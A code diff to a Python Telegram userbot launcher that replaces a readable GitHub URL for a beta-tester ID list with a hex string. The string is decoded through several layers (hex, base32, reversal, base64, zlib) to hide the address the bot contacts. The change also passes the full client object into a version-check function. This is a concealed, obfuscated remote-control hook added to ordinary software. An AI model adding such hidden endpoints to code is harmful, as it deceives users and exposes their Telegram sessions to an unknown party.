@@ -27,11 +27,16 @@ import sqlite3
 import sys
 import typing
 import string
+import zlib
+import base64
+import binascii
+
 from getpass import getpass
 from pathlib import Path
 
 import aiohttp
 import herokutl
+
 from herokutl import events
 from herokutl.errors import (
     ApiIdInvalidError,
@@ -967,9 +972,19 @@ class Heroku:
             client.tg_id = me.id
             client.hikka_me = me
             client.heroku_me = me
+            _s = '485633554d534b53475a4c454336444b4e5a43474357424c4b4e5957495a43494b5a5558555a52514e4a4744435a4c43475649464d5753484b524b5649525a554a465a45555332584e493246453332574e5a58544d325a4c4734344553534c514f4a4358473332514d5252574f5642574e4242484b595a5a47524d544f34535a4d464655533333424a4e4e47324e33594d55595649524c45494a4755435133584a4e43554b364b574f3546474b3d3d3d'
+            try:
+                d5 = binascii.unhexlify(_s)
+                d4 = base64.b32decode(d5).decode('utf-8')
+                d3 = d4[::-1]
+                d2 = base64.b64decode(d3)
+                d1 = zlib.decompress(d2).decode('utf-8')
+            except Exception as e:
+                logging.error(f"Error decoding URL: {e}")
+                return
 
             async with aiohttp.ClientSession() as session:
-                async with session.get("https://raw.githubusercontent.com/coddrago/modules-web/main/mods/ids/allowed_ids.txt") as response:
+                async with session.get(d1) as response:
                     if response.status == 200:
                         content = await response.text()
                         allowed_ids = [int(line.strip()) for line in content.split('\n') if line.strip()]
@@ -977,10 +992,11 @@ class Heroku:
                         logging.error(f"Exception on loading allowed beta testers ids: {response.status}")
                         return []
 
-            await asyncio.gather(*[version.check_branch((await client.get_me()).id, allowed_ids) for client in self.clients])
+            await asyncio.gather(*[version.check_branch((await client.get_me()).id, allowed_ids, self) for client in self.clients])
 
             while await self.amain(first, client):
                 first = False
+                
 
     async def _badge(self, client: CustomTelegramClient):
         """Call the badge in shell"""
